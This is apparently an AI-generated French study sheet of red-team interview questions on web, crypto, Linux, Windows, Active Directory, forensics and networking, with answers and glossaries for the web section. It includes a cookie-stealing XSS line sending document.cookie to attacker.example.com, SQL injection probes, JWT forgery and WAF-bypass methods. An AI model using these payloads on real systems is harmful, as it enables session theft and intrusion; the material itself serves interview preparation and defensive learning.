# Web (applications)

(questions orientées exploitation / reconnaissance / post-exploit web). [CyberSapiens+1](https://cybersapiens.com.au/most-asked-web-application-penetration-testing-interview-questions-and-answers/?utm_source=chatgpt.com)

1. Explique le modèle d’attaque pour une application web (recon → fuzzing → exploitation → post-exploitation).
2. Donne 3 méthodes pour trouver/contourner une authentification vulnérable (session fixation, JWT manipulation, bruteforce + lockout).
3. Comment détecter et exploiter une SQL injection (typesSQLi, payloads, exfiltration via time-based)?
4. Explique XSS (stocké vs réfléchi vs DOM). Donne un exemple d’exfiltration de cookie via XSS.
5. Qu’est-ce que CSRF et comment l’atténuer / l’exploiter si l’application est vulnérable ?
6. Comment tu ferais pour contourner une WAF/IPS côté application ? (bypass d’encodage, fragmentation, polymorphisme)
7. Comment analyser un JWT mal configuré ? (alg=none, clé faible, alg confusion)
8. Quelles sont les étapes pour trouver une RCE (remote code execution) sur une app (upload, template injection, deserialization) ?
9. Explique les risques d’une désérialisation non sécurisée (Java/.NET/PHP) et donne une méthode d’exploitation.
10. Parle-moi d’un cas réel d’exploitation que tu as réalisé (ou, si hypothétique, décris le plan d’attaque).

# Crypto

(basics → attaques pratiques — ce que le recruteur attend : compréhension des primitives + pièges). [InfosecTrain+1](https://www.infosectrain.com/blog/top-cryptography-interview-questions/?utm_source=chatgpt.com)

1. Quelle est la différence entre chiffrement symétrique et asymétrique ? exemples d’usage.
2. Explique le rôle des IV et du mode d’opération (CBC vs GCM). Que se passe-t-il si l’IV est réutilisé ?
3. Qu’est-ce qu’une fonction de hachage sécurisée ? Donne des exemples (SHA-2, SHA-3) et faiblesses (MD5).
4. Explique le concept de « forward secrecy » et comment TLS l’implémente.
5. Qu’est-ce que le padding oracle attack ? Donne un exemple d’exploitation contre CBC.
6. Comment attaquer un système qui stocke des mots de passe ? (attaques par hash, salts, bcrypt/argon2)
7. Explique Kerberos au niveau chiffrement (tickets, clés de session) — quels problèmes peuvent être exploités ?
8. Donne un exemple d’attaque sur PKI (compromission CA, certificate pinning bypass).
9. Quand et pourquoi un chiffrement maison (« rolling your own crypto ») est dangereux ?
10. Expliquer une attaque contre TLS (downgrade, mauvais ciphersuites) et comment la détecter.

# Linux

(questions techniques sur exploitation d’hôtes Linux et post-exploitation). [GitHub](https://github.com/redteamcaptain/Pentesting-Interview-Questions?utm_source=chatgpt.com)

1. Expliquer le processus de démarrage (systemd) et où regarder pour des services mal configurés.
2. Comment escalader les privilèges sur Linux ? Donne 5 vecteurs courants (SUID, cron jobs, noyau vulnérable, PATH, misconfiguration sudo).
3. Qu’est-ce qu’un binaire SUID et comment l’exploiter de façon sécurisée ? Donne un exemple pratique.
4. Décrire comment tu installerais un accès persistant discret (persistence) tout en minimisant la détection.
5. Comment analyser un système pour trouver des secrets (fichiers de config, variables d’environnement, credentials en clair) ?
6. Explique l’utilisation de `strace`/`ltrace` pour le reverse engineering d’un binaire sur une box.
7. Décris la méthode pour bypasser une politique AppArmor/SELinux (ou comment en tirer parti pour la détection).
8. Comment récupérer des informations utiles depuis la mémoire (`/proc`, `ss`, `netstat`, `ps`, `lsof`)?
9. Quels outils tu utilises pour la post-exploitation (meterpreter, socat, netcat, cron, systemd timers) et pourquoi ?
10. Parle d’une expérience où tu as durci ou contourné des protections Linux (auditing/EDR).

# Windows

(internals, exploitation, outils et persistence). [Index.dev+1](https://www.index.dev/interview-questions/red-team-engineer?utm_source=chatgpt.com)

1. Explique le modèle de sécurité Windows (tokens, UAC, SID) et comment UAC peut être contourné.
2. Quelles sont les méthodes d’escalade de privilèges sous Windows ? (exploitation de services, DLL hijacking, token impersonation)
3. Explique le fonctionnement d’AMSI et des méthodes pour le bypass.
4. Que fait le Windows Credential Guard / LSA / LSASS et comment les attaquer/défendre ?    
5. Décrire la création d’un implant C2 : common techniques pour éviter l’AV/EDR (mutations, off-the-shelf vs custom)
6. Comment faire de l’OPSEC (operational security) lors d’une campagne Windows (logs, nettoyage, living off the land) ?
7. Explique la persistance via Scheduled Tasks, Services, Run keys, WMI.
8. Décrire l’usage de PowerShell pour l’intrusion (modules, encodage, AMSI bypass) et contre-mesures.
9. Comment analyser un dump LSASS pour récupérer des credentials ; quels outils utilises-tu ?
10. Explique comment détecter et contourner un EDR moderne (basics: whitelisting, hooking, ETW).

# Active Directory (AD)

(sujet clé Red Team — beaucoup de questions techniques réelles). [Medium+1](https://medium.com/meetcyber/8-realistic-interview-questions-on-attacks-against-active-directory-4a28f5e96113?utm_source=chatgpt.com)

1. Explique le flux d’authentification Kerberos dans AD (TGT, TGS). Qu’est-ce que le Kerberoasting ?
2. Qu’est-ce que l’AS-REP roasting et dans quel cas est-il applicable ?
3. Explique Pass-the-Hash et Pass-the-Ticket. Comment les prévenir ?
4. Qu’est-ce que LAPS et comment il change l’attaque sur les comptes locaux ?
5. Explique DCSync / DCSync abuse et quelles permissions sont nécessaires.
6. Comment réaliser une reconnaissance AD discrète (bloodhound, ldap queries) et limiter le bruit ?
7. Quels sont les vecteurs pour obtenir des comptes à privilèges (GPO misconfigurés, SPNs pour kerberoast, ACLs faibles) ?
8. Explique l’attaque « Over-pass the Hash » / « Golden Ticket » / « Silver Ticket » et leurs différences.
9. Méthodologie pour compromettre un domaine depuis un poste utilisateur compromis (pivot, lateral movement, credential harvesting).
10. Stratégies de mitigation et détection à recommander après un engagement Red Team.

# Forensic

(analyse post-incident, artefacts, timeline). [elhacker.info+1](https://elhacker.info/ebooks%20Joas/INTERVIEW%20QUESTION%20TIPS%20%E2%80%93%20PENTEST%2C%20RED%20TEAM%2C%20APPSEC%20AND%20BLUE%20TEAM.pdf?utm_source=chatgpt.com)

1. Décris ta méthodologie pour collecter des preuves sur une machine compromise (chain of custody, acquisition bit-for-bit).
2. Quels artefacts Windows regardes-tu pour établir une timeline (Event Logs, Prefetch, MFT, registry, schedules) ?
3. Comment analyser une image disque Linux pour trouver des traces d’intrusion ?
4. Explique comment tu détecterais un implant persistant déguisé (services, drivers, scheduled tasks, kernel modules).
5. Méthodes pour extraire des secrets depuis la mémoire (process dumps, Mimikatz pour Windows) et leurs limitations légales/éthiques.
6. Quels outils utilises-tu pour l’analyse réseau/pcap (Wireshark, tshark) et quelles signatures/indicateurs recherches-tu ?
7. Décrire comment faire de la corrélation entre logs réseau et logs hôte pour reconstituer le parcours d’un attaquant.
8. Explique l’analyse d’un binaire suspect (strings, static analysis, sandbox) — qu’est-ce que tu regardes en priorité ?
9. Quand et pourquoi utiliser des hash (MD5/SHA) pour l’intégrité des preuves ?
10. Donne un exemple de rapport forensique : quelles sections et niveau de détail proposer ?

# Réseau

(tcp/ip, pivoting, détection, protocoles). [GitHub+1](https://github.com/redteamcaptain/Pentesting-Interview-Questions?utm_source=chatgpt.com)

1. Expliquer la pile TCP/IP : différence entre TCP et UDP, handshakes, flags importants.
2. Qu’est-ce qu’un MITM et quelles techniques (ARP spoofing, DHCP spoofing, DNS spoofing) ?
3. Décrire le NAT, PAT, et comment fonctionne la translation de ports.
4. Comment réaliser du port forwarding / pivoting depuis un hôte compromis pour atteindre un réseau interne (SSH tunneling, proxychains, socat, RPort)?
5. Explique les concepts de MTU, fragmentation, et comment ils peuvent être abusés pour contourner détections.
6. Que regardes-tu dans un PCAP pour repérer un C2 ? (beacons périodiques, DNS over HTTP, trafics chiffrés atypiques)
7. Méthodes de contournement des IDS/IPS réseau (encodage, fragmentation, tunnels chiffrés).
8. Qu’est-ce que DNS exfiltration et comment la détecter ?
9. Décris la mise en place d’un canal covert (DNS, ICMP, HTTPs) et les tradeoffs OPSEC.
10. Comment concevoir des règles de détection réseau pour des comportements Red Team (ex: fréquence/beacons, connexions externes inhabituelles) ?


## Réponses:

# Web (applications)

## 1) Modèle d’attaque pour une application web (recon → fuzzing → exploitation → post-exploitation)

- **Étapes principales**
  - **Reconnaissance passive** : collecte d’informations sans interagir directement avec la cible (ex. whois, archives, moteurs de recherche).
  - **Reconnaissance active** : interrogation directe (scan de ports, crawling de pages) pour cartographier endpoints et paramètres.
  - **Fuzzing / scanning** : envoi automatisé de nombreuses requêtes (payloads) pour trouver comportements anormaux.
  - **Validation manuelle** : confirmer manuellement les découvertes automatisées pour éviter les faux positifs.
  - **Exploitation** : utiliser une vulnérabilité identifiée (ex. SQLi, XSS, RCE) pour obtenir un accès ou exfiltrer des données.
  - **Post-exploitation** : actions après accès (shell, pivot, harvest de credentials), maintenir l’accès (persistence) et limiter la détection (OPSEC).
  - **Reporting / remediation** : documenter la faille, PoC (preuve de concept) non destructrice et recommandations de correction.

- **Glossaire rapide**
  - **Whois** : base publique d’enregistrement de noms de domaine (contact, dates).
  - **Crawling** : parcourir automatiquement un site pour en lister les pages/endpoints.
  - **Endpoint** : URL ou route exposant une fonctionnalité (ex. `/login`, `/api/user`).
  - **Payload** : contenu malveillant ou test envoyé pour provoquer une vulnérabilité.
  - **False positive** : alerte indiquant une fausse vulnérabilité.
  - **RCE (Remote Code Execution)** : exécution de code arbitraire sur le serveur.
  - **Pivot** : utiliser une machine compromise pour atteindre d’autres segments réseau.
  - **Persistence** : mécanismes permettant de garder l’accès (ex. cron, scheduled task).
  - **OPSEC** : pratiques pour réduire traces et risques opérationnels.

---

## 2) 3 méthodes pour trouver / contourner une authentification vulnérable

- **Session fixation**
  - Tester si l’application **regénère l’ID de session** après authentification.
  - Méthode : forcer un cookie de session connu avant login, vérifier s’il reste valide après connexion.

- **JWT manipulation**
  - Inspecter l’en-tête (header) et les claims ; tester `alg=none`, confusion `RS256` vs `HS256`, ou clé faible.
  - Méthode : décoder base64url, modifier claims (ex : `admin:true`) et voir si la signature est validée.

- **Brute-force / credential stuffing**
  - Tester un grand nombre de mots de passe ou paires email/password (credential stuffing = réutilisation de fuites).
  - Évaluer la présence de *throttling* (limitation) et de verrous (account lockout), chercher endpoints alternatifs qui échappent au blocage.

- **Glossaire rapide**
  - **Cookie de session** : petit fichier stocké côté client identifiant une session serveur.
  - **JWT (JSON Web Token)** : jeton encodé (header.payload.signature) utilisé pour authentifier sans session serveur.
  - **alg=none** : valeur vulnérable indiquant "pas de signature" si la validation serveur est mauvaise.
  - **RS256 / HS256** : algorithmes de signature (RS = asymétrique, HS = symétrique).
  - **Credential stuffing** : automatiser l’usage de combinaisons identifiants/mots de passe obtenues ailleurs.
  - **Throttling** : limitation du nombre de requêtes sur une période.
  - **Account lockout** : verrouillage du compte après trop d’essais ratés.

---

## 3) Détecter et exploiter une SQL Injection (SQLi)

- **Processus de détection**
  - Tester caractères spéciaux (`'`, `"`, `--`) et tautologies (`' OR 1=1--`) pour provoquer des comportements différents.
  - Provoquer erreurs contrôlées (ex. `UNION`) pour révéler schéma de la DB si possible.
  - Si pas d’erreur, utiliser *time-based* (ex. `SLEEP(5)`) pour mesurer latence et inférer données.

- **Techniques d’exploitation**
  - **Error-based** : utiliser messages d’erreur pour extraire tables/colonnes.
  - **Union-based** : joindre le résultat d’une injection à la requête normale pour lire colonnes.
  - **Boolean / blind** : inférence bit à bit via conditions vraies/faux.
  - **Time-based** : exfiltrer en observant délai volontaire.

- **Outils**
  - `sqlmap` pour automatiser, mais commencer par tests manuels pour un PoC propre.

- **Glossaire rapide**
  - **SQLi (SQL Injection)** : insertion de code SQL malveillant via des entrées non-sanitized.
  - **Tautologie** : expression toujours vraie (ex : `1=1`) utilisée pour contourner filtres.
  - **UNION SELECT** : clause SQL pour combiner résultats de plusieurs requêtes.
  - **Blind SQLi** : quand l’application ne renvoie pas d’erreur, on infère via réponses booléennes ou temps.
  - **Schema** : structure de la base (tables, colonnes).

---

## 4) XSS (stocké vs réfléchi vs DOM) + exemple d’exfiltration de cookie

- **Types**
  - **Reflected (réfléchi)** : payload inclus dans la requête (URL/form) et renvoyé immédiatement; souvent exploité via liens piégés.
  - **Stored (persistant)** : payload sauvegardé côté serveur (ex. commentaire) et servi à d’autres utilisateurs.
  - **DOM-based** : vulnérabilité côté client : le JavaScript manipule `location`/`innerHTML` sans sanitization.

- **Exfiltration simple de cookie**
  - Exemple JS injecté :  
    ```js
    new Image().src = 'https://attacker.example.com/?c=' + encodeURIComponent(document.cookie);
    ```
  - Condition : si le cookie **n’est pas** protégé par le flag `HttpOnly`, le script peut le lire et l’envoyer à un serveur contrôlé.

- **Mitigations**
  - Encoder/échaper la sortie (output encoding), utiliser **CSP** (Content Security Policy), définir cookie `HttpOnly` et `SameSite`.

- **Glossaire rapide**
  - **document.cookie** : propriété JS donnant accès aux cookies non `HttpOnly`.
  - **HttpOnly** : flag qui empêche l’accès JS au cookie (limite exfiltration via XSS).
  - **CSP (Content Security Policy)** : en-tête HTTP définissant règles de chargement/exécution de ressources (réduit XSS).
  - **Sanitization / escaping** : nettoyage ou encodage des données avant affichage pour éviter exécution.

---

## 5) CSRF (Cross-Site Request Forgery) — principe et atténuations

- **Principe**
  - Forcer un navigateur authentifié à exécuter une action (ex. transfert, suppression) sur un site via une page contrôlée par l’attaquant.

- **Exploitation simple**
  - Placer un `<form>` auto-soumis ou une requête `fetch` sur une page externe ; si le navigateur envoie automatiquement le cookie d’authentification, l’action se réalise.

- **Atténuations efficaces**
  - **Anti-CSRF tokens** : jetons uniques par session/form vérifiés côté serveur.
  - **SameSite cookies** : bloquent l’envoi automatique de cookies depuis des origines tierces.
  - Valider `Origin` / `Referer` headers pour requêtes sensibles.
  - **Double-submit cookie** : envoyer token à la fois dans cookie et paramètre et vérifier correspondance.

- **Glossaire rapide**
  - **Origin / Referer** : headers HTTP indiquant provenance d’une requête.
  - **SameSite** : attribut de cookie qui restreint son envoi depuis des sites tiers.
  - **Anti-CSRF token** : valeur aléatoire injectée dans formulaire et validée côté serveur.

---

## 6) Contourner une WAF / IPS côté application (principes éthiques inclus)

- **Approches courantes**
  - **Encodage alternatif** : URL encoding, double-encoding pour bypasser signatures textuelles.
  - **Fragmentation** : découper payload en plusieurs morceaux (chunking) pour éviter détection par pattern matching.
  - **Obfuscation / polymorphisme** : modifier l’apparence (espaces, commentaires, casse) pour casser signatures simples.
  - **Tunneling via endpoints whitelisted** : utiliser fonctionnalités légitimes (ex. upload + processing) pour exécuter payload.
  - **Tests itératifs** : envoyer petites variations pour "fingerprinter" la WAF (identifier règles).

- **Risque & éthique**
  - Toujours respecter règles d’engagement : éviter DoS, ne pas compromettre stabilité.

- **Glossaire rapide**
  - **WAF (Web Application Firewall)** : pare-feu qui filtre/règle trafic HTTP pour bloquer attaques connues.
  - **IPS (Intrusion Prevention System)** : blocage automatique d’activités malveillantes réseau/host.
  - **Signature** : motif utilisé pour identifier trafic malveillant.
  - **Tunneling** : encapsuler trafic malveillant dans un flux légitime.

---

## 7) Analyser un JWT mal configuré

- **Étapes d’analyse**
  - Décoder header & payload (base64url) pour lire `alg`, `kid`, et claims (`exp`, `iss`, `aud`).
  - Vérifier que `alg` n’est pas `none` et que la validation ne fait pas de confusion RS/HS (asymétrique vs symétrique).
  - Tester si `kid` (Key ID) référence une clé contrôlée ou si la clé publique est utilisée comme secret symétrique (confusion).
  - Vérifier la robustesse de la clé (essayer bruteforce si clé courte/faible).
  - Valider claims : expiration (`exp`), audience (`aud`), issuer (`iss`) ; tester manipulation de claims.

- **Glossaire rapide**
  - **Base64url** : encodage utilisé dans JWT (variante URL-safe de base64).
  - **alg** : algorithme de signature (ex: HS256, RS256).
  - **kid** : identifiant de clé permettant au serveur de choisir la clé de validation.
  - **Claim** : déclaration contenue dans le token (ex: `sub`, `exp`).
  - **RS256 vs HS256** : RS utilise paire clé publique/privée (asymétrique), HS utilise clé partagée (symétrique).
  - **alg=none** : option indiquant absence de signature si le serveur l’accepte, vulnérable.

---

## 8) Étapes pour trouver une RCE (upload, template injection, deserialization)

- **Méthodologie**
  - **Identifier surfaces** : endpoints d’upload, champs qui acceptent templates ou données sérialisées.
  - **Tester upload** : bypass Content-Type/extension, tenter upload d’un web-shell ou fichier contenant payload exécutable côté serveur.
  - **Vérifier template engines** : injecter payloads spécifiques (ex. Jinja2 `{{7*7}}`) pour identifier evaluation côté serveur.
  - **Tester désérialisation** : soumettre objets sérialisés modifiés et observer comportements (exceptions, connexions sortantes).
  - **Progression prudente** : commencer par PoC non destructifs, confirmer RCE avant exploitation complète.

- **Glossaire rapide**
  - **Web-shell** : script serveur donnant interface d’exécution à distance.
  - **Template engine** : moteur qui rend des templates HTML (ex: Jinja2, Twig); peut exécuter expressions si mal configuré.
  - **Désérialisation** : conversion d’un format binaire/texte en objet en mémoire; dangereuse si données non-sûres sont acceptées.
  - **Content-Type** : en-tête HTTP indiquant le type de données envoyées (`multipart/form-data`, `application/json`).
  - **PoC (Proof of Concept)** : démonstration contrôlée d’une vulnérabilité.

---

## 9) Risques d’une désérialisation non sécurisée (Java/.NET/PHP) + méthode d’exploitation

- **Risques**
  - Exécution de code arbitraire via **gadget chains** (suites de classes qui, lors de la désérialisation, déclenchent des comportements dangereux).
  - Escalade de privilèges, fuite d’informations ou exécution de commandes systèmes.

- **Méthode d’exploitation (général)**
  - Identifier le langage & framework côté serveur.
  - Construire un objet sérialisé malveillant contenant un gadget chain connu (ex. `ysoserial` pour Java).
  - Envoyer le payload au endpoint qui désérialise et observer exécution (commande, callback réseau).

- **Mitigations**
  - Éviter désérialiser des données non-fiables.
  - Utiliser allowlists de classes, signer/encrypter objets, préférer JSON/format safe.

- **Glossaire rapide**
  - **Gadget chain** : série de classes/méthodes qui, combinées, permettent exécution malveillante lors de la désérialisation.
  - **ysoserial** : outil pour générer payloads de désérialisation Java exploitables.
  - **Allowlist** : liste autorisée (opposé à blocklist), contrôle plus strict sur ce qui est permis.

---

## 10) Raconter un cas réel / plan d’attaque (structure et points à mentionner)

- **Structure idéale (STAR)**
  - **Situation** : contexte (type d’app, portée autorisée).
  - **Task** : objectif (ex: prouver accès sans détruire).
  - **Action** : étapes (recon, tests manuels, exploitation, post-exploit).
  - **Result** : impact, preuve (PoC), recommandations et remédiations proposées.

- **Ce qu’il faut mettre en avant**
  - Respect des règles d’engagement et limites légales.
  - Mesures OPSEC (logs, tests non destructifs).
  - Remédiations techniques précises (ex: paramétrer `HttpOnly`, patch libs, utiliser allowlist).
  - Preuves mesurables sans divulguer de données sensibles (hashes, screenshots anonymisés, extrait de logs).

- **Glossaire rapide**
  - **STAR** : méthode de réponse en entretien (Situation, Task, Action, Result).
  - **PoC non destructif** : preuve montrant la faille sans endommager le système.
  - **Rules of engagement** : conditions légales/contractuelles définissant ce qu’on a le droit de tester.

---

### Notes d'utilisation
- Exporte ce fichier dans ton vault Obsidian, nomme-le `web_redteam_fiche.md`.
- Tu peux ajouter des backlinks Obsidian (ex: `[[JWT]]`, `[[XSS]]`) pour créer des pages détaillées sur chaque terme.
- Si tu veux, je génère aussi une version "flashcards" (question + 3 bullets) ou des réponses orales 15–20s.